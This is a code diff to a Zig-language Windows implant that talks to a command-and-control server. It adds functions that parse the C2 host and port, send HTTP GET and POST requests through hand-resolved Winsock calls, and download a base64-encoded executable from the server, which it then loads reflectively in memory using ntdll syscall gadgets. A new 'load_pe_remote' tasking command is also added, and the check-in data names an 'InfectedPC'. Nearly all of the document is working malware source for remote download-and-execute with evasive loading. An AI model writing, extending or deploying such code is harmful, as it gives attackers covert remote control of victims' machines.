@@ -1,4 +1,5 @@
 const std = @import("std");
+const C2_SERVER = "127.0.0.1:3000"; 
 
 // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 // WINDOWS STRUCTS
@@ -729,7 +730,7 @@ fn resolve_export(dll_base: *anyopaque, func_name: []const u8) ?*anyopaque {
 }
 
 // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-// WINDOWS API WRAPPERS
+// HELPER FUNCTIONS 
 // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
 fn htons(hostshort: u16) u16 {
@@ -756,6 +757,26 @@ fn inet_addr(cp: [*:0]const u8) u32 {
     return result;
 }
 
+fn buildUrl(allocator: std.mem.Allocator, path: []const u8) ![]u8 {
+    return std.fmt.allocPrint(allocator, "{s}{s}", .{C2_SERVER, path});
+}
+
+fn unescapePath(allocator: std.mem.Allocator, path: []const u8) ![]u8 {
+    var result = std.ArrayList(u8).init(allocator);
+    var i: usize = 0;
+    while (i < path.len) {
+        if (i + 1 < path.len and path[i] == '\\' and path[i + 1] == '\\') {
+            try result.append('\\');
+            i += 2;
+        } else {
+            try result.append(path[i]);
+            i += 1;
+        }
+    }
+    return result.toOwnedSlice();
+}
+
+
 // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 // HTTP COMMUNICATION VIA WINSOCK
 // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -781,7 +802,8 @@ fn initWinsock() !void {
     if (result != 0) return error.WSAStartupFailed;
 }
 
-fn sendHttpPost(allocator: std.mem.Allocator, path: []const u8, body: []const u8) ![]u8 {
+fn sendHttpPost(allocator: std.mem.Allocator, url: []const u8, body: []const u8) ![]u8 {
+    
     const ws2_32_name = [_]u16{'w','s','2','_','3','2','.','d','l','l'};
     const ws2_32_base = findModule(&ws2_32_name).?;
     
@@ -790,6 +812,40 @@ fn sendHttpPost(allocator: std.mem.Allocator, path: []const u8, body: []const u8
     const send_fn = @as(*const fn(SOCKET, [*]const u8, i32, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "send").?));
     const recv_fn = @as(*const fn(SOCKET, [*]u8, i32, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "recv").?));
     const closesocket_fn = @as(*const fn(SOCKET) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "closesocket").?));
+    
+    // Parse URL (format: "host:port/path")
+    var buffer: [32]u8 = undefined;
+    var len: usize = 0;
+    
+    var path: []const u8 = "/";
+    var host: []const u8 = undefined;
+    var port: []const u8 = undefined;
+
+    for (url, 0..) |byte, i| {
+        if (byte == '/') {
+            path = url[i..];
+            break;
+        }
+        buffer[len] = byte;
+        len += 1;
+    }
+
+    const host_port = buffer[0..len];
+
+    for (host_port, 0..) |b, index| {
+        if (b == ':') {
+            host = host_port[0..index];
+            port = host_port[index + 1..];
+            break;
+        }
+    }
+
+    const port_num = try std.fmt.parseInt(u16, port, 10);
+  
+
+    var host_z: [32:0]u8 = undefined;
+    @memcpy(host_z[0..host.len], host);
+    host_z[host.len] = 0;
     
     const sock = socket_fn(
         2, 
@@ -801,8 +857,8 @@ fn sendHttpPost(allocator: std.mem.Allocator, path: []const u8, body: []const u8
     
     const server_addr = SOCKADDR_IN{
         .sin_family = 2, 
-        .sin_port = htons(3000),
-        .sin_addr = inet_addr("127.0.0.1"),
+        .sin_port = htons(port_num),
+        .sin_addr = inet_addr(@ptrCast(&host_z)),
         .sin_zero = [_]u8{0} ** 8,
     };
     
@@ -815,13 +871,13 @@ fn sendHttpPost(allocator: std.mem.Allocator, path: []const u8, body: []const u8
     
     try request.writer().print(
         "POST {s} HTTP/1.1\r\n" ++
-        "Host: 127.0.0.1:3000\r\n" ++
+        "Host: {s}:{s}\r\n" ++
         "Content-Type: application/json\r\n" ++
         "Content-Length: {d}\r\n" ++
         "Connection: close\r\n" ++
         "\r\n" ++
         "{s}",
-        .{ path, body.len, body }
+        .{ path, host, port, body.len, body }
     );
     
     var sent: usize = 0;
@@ -850,6 +906,101 @@ fn sendHttpPost(allocator: std.mem.Allocator, path: []const u8, body: []const u8
     return allocator.dupe(u8, "");
 }
 
+fn sendHttpGet(allocator: std.mem.Allocator, url: []const u8) ![]u8 {
+    
+    const ws2_32_name = [_]u16{'w','s','2','_','3','2','.','d','l','l'};
+    const ws2_32_base = findModule(&ws2_32_name).?;
+    
+    const socket_fn = @as(*const fn(i32, i32, i32) callconv(.C) SOCKET, @ptrCast(resolve_export(ws2_32_base, "socket").?));
+    const connect_fn = @as(*const fn(SOCKET, *const SOCKADDR_IN, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "connect").?));
+    const send_fn = @as(*const fn(SOCKET, [*]const u8, i32, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "send").?));
+    const recv_fn = @as(*const fn(SOCKET, [*]u8, i32, i32) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "recv").?));
+    const closesocket_fn = @as(*const fn(SOCKET) callconv(.C) i32, @ptrCast(resolve_export(ws2_32_base, "closesocket").?));
+    
+    // Parse URL (format: "host:port/path")
+    var buffer: [32]u8 = undefined;
+    var len: usize = 0;
+    
+    var path: []const u8 = "/";
+    var host: []const u8 = undefined;
+    var port: []const u8 = undefined;
+
+    for (url, 0..) |byte, i| {
+        if (byte == '/') {
+            path = url[i..];
+            break;
+        }
+        buffer[len] = byte;
+        len += 1;
+    }
+
+    const host_port = buffer[0..len];
+
+    for (host_port, 0..) |b, index| {
+        if (b == ':') {
+            host = host_port[0..index];
+            port = host_port[index + 1..];
+            break;
+        }
+    }
+
+    const port_num = try std.fmt.parseInt(u16, port, 10);
+
+    var host_z: [32:0]u8 = undefined;
+    @memcpy(host_z[0..host.len], host);
+    host_z[host.len] = 0;
+    
+    const sock = socket_fn(2, 1, 0); 
+    if (sock == ~@as(usize, 0)) return error.SocketCreationFailed;
+    defer _ = closesocket_fn(sock);
+    
+    const server_addr = SOCKADDR_IN{
+        .sin_family = 2, 
+        .sin_port = htons(port_num),
+        .sin_addr = inet_addr(@ptrCast(&host_z)),
+        .sin_zero = [_]u8{0} ** 8,
+    };
+    
+    if (connect_fn(sock, &server_addr, @sizeOf(SOCKADDR_IN)) != 0) {
+        return error.ConnectionFailed;
+    }
+    
+    var request = std.ArrayList(u8).init(allocator);
+    defer request.deinit();
+    
+    try request.writer().print(
+        "GET {s} HTTP/1.1\r\n" ++
+        "Host: {s}:{s}\r\n" ++
+        "Connection: close\r\n" ++
+        "\r\n",
+        .{ path, host, port }
+    );
+    
+    var sent: usize = 0;
+    while (sent < request.items.len) {
+        const n = send_fn(sock, request.items.ptr + sent, @intCast(request.items.len - sent), 0);
+        if (n <= 0) return error.SendFailed;
+        sent += @intCast(n);
+    }
+    
+    var response = std.ArrayList(u8).init(allocator);
+    defer response.deinit();
+    
+    var buf: [4096]u8 = undefined;
+    while (true) {
+        const n = recv_fn(sock, &buf, buf.len, 0);
+        if (n <= 0) break;
+        try response.appendSlice(buf[0..@intCast(n)]);
+    }
+    
+    const response_str = response.items;
+    if (std.mem.indexOf(u8, response_str, "\r\n\r\n")) |body_start| {
+        const body_content = response_str[body_start + 4..];
+        return allocator.dupe(u8, body_content);
+    }
+    
+    return allocator.dupe(u8, "");
+}
 // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 // JSON PARSING & UTILITY
 // ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
@@ -1289,7 +1440,32 @@ var global_gadget: ?*anyopaque = null;
 var previous_pe_base: ?*anyopaque = null;
 var previous_section_handle: ?*anyopaque = null;
 
-// fn loadPEfromC2 <- add me later!
+fn loadPeFromC2(allocator: std.mem.Allocator, c2_url: []const u8) ![]const u8 {
+        if (global_gadget == null) {
+        const ntdll_name = [_]u16{ 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l' };
+        const ntdll_base = findModule(&ntdll_name).?;
+        global_gadget = find_syscall_gadget(ntdll_base);
+        if (global_gadget == null) return error.NoSyscallGadget;
+    }
+    
+    const url = try buildUrl(allocator, c2_url);
+    defer allocator.free(url);
+
+    const json_response = try sendHttpGet(allocator, url);
+    defer allocator.free(json_response);
+
+    const parsed = try std.json.parseFromSlice(std.json.Value, allocator, json_response, .{});
+    defer parsed.deinit();
+
+   const pe_base64 = parsed.value.object.get("pe").?.string;
+
+    const decoder = std.base64.standard.Decoder;
+    const decoder_size = try decoder.calcSizeForSlice(pe_base64);
+    const pe_bytes = try allocator.alloc(u8, decoder_size);
+    try decoder.decode(pe_bytes, pe_base64);
+
+    return reflective_load(allocator, pe_bytes, global_gadget.?);
+}
 
 fn loadPEFromPath(allocator: std.mem.Allocator, path: []const u8) ![]const u8 {
     if (global_gadget == null) {
@@ -1330,7 +1506,9 @@ fn submitResult(allocator: std.mem.Allocator, task_id: []const u8, output: []con
         .{ task_id, escaped }
     );
 
-    const response = try sendHttpPost(allocator, "/result", payload.items);
+    const results = try buildUrl(allocator, "/results");
+    defer allocator.free(results);
+    const response = try sendHttpPost(allocator, results , payload.items);
     defer allocator.free(response);
 }
 
@@ -1340,8 +1518,9 @@ fn checkin(allocator: std.mem.Allocator) !void {
     const payload = 
         \\{"implant_id":"agent_001","hostname":"InfectedPC","username":"Mirai","os_info":"Windows 11"}
     ;
-
-    const body = try sendHttpPost(allocator, "/checkin", payload);
+    const check_in = try buildUrl(allocator, "/checkin");
+    defer allocator.free(check_in);
+    const body = try sendHttpPost(allocator, check_in, payload);
     defer allocator.free(body);
     
     std.debug.print("[+] Received: {s}\n", .{body});
@@ -1356,43 +1535,45 @@ fn checkin(allocator: std.mem.Allocator) !void {
         tasks.deinit();
     }
 
-    for (tasks.items) |task| {
-        std.debug.print("[+] Executing: {s} {s}\n", .{task.command, task.args});
-        if (std.mem.eql(u8, task.command, "load_pe")) {
-        // Unescape the path
-        var unescaped_path = std.ArrayList(u8).init(allocator);
-        defer unescaped_path.deinit();
+for (tasks.items) |task| {
+    std.debug.print("[+] Executing: {s} {s}\n", .{task.command, task.args});
+    
+    const result = if (std.mem.eql(u8, task.command, "load_pe")) blk: {
+        const path = try unescapePath(allocator, task.args);
+        defer allocator.free(path);
         
-    var i: usize = 0;
-    while (i < task.args.len) {
-        if (i + 1 < task.args.len and task.args[i] == '\\' and task.args[i + 1] == '\\') {
-            try unescaped_path.append('\\');
-            i += 2;
-        } else {
-            try unescaped_path.append(task.args[i]);
-            i += 1;
-        }
-    }
-    
-    const path = unescaped_path.items;
-    std.debug.print("[+] Loading PE from: {s}\n", .{path});
-    
-    const result = loadPEFromPath(allocator, path) catch |err| blk: {
-        var err_buf: [256]u8 = undefined;
-        const err_msg = std.fmt.bufPrint(&err_buf, "PE load failed: {}", .{err}) catch "PE Load Error";
-        std.debug.print("[!] Error: {s}\n", .{err_msg});
-        break :blk try allocator.dupe(u8, err_msg);
+        std.debug.print("[+] Loading PE from disk: {s}\n", .{path});
+        break :blk loadPEFromPath(allocator, path) catch |err| {
+            const err_msg = try std.fmt.allocPrint(allocator, "PE load failed: {}", .{err});
+            std.debug.print("[!] {s}\n", .{err_msg});
+            break :blk err_msg;
+        };
+        
+    } else if (std.mem.eql(u8, task.command, "load_pe_remote")) blk: {
+          const filename = task.args; // This is "main.exe"
+    const path = try std.fmt.allocPrint(allocator, "/payload/{s}", .{filename});
+    defer allocator.free(path);
+
+        std.debug.print("[+] Loading PE from C2: {s}\n", .{path});
+        break :blk loadPeFromC2(allocator, path) catch |err| {
+            const err_msg = try std.fmt.allocPrint(allocator, "Remote PE load failed: {}", .{err});
+            std.debug.print("[!] {s}\n", .{err_msg});
+            break :blk err_msg;
+        };
+        
+    } else blk: {
+        break :blk try allocator.dupe(u8, "Unknown command");
     };
-    defer allocator.free(result);
     
+    defer allocator.free(result);
     std.debug.print("[*] Result: {s}\n", .{result});
     submitResult(allocator, task.task_id, result) catch {};
 }
-    }
+
 }
 
 pub fn main() !void {
-    var buffer: [2 * 1024 * 1024]u8 = undefined;
+    var buffer: [10 * 1024 * 1024]u8 = undefined;
     var fba = std.heap.FixedBufferAllocator.init(&buffer);
     var allocator = fba.allocator();
 
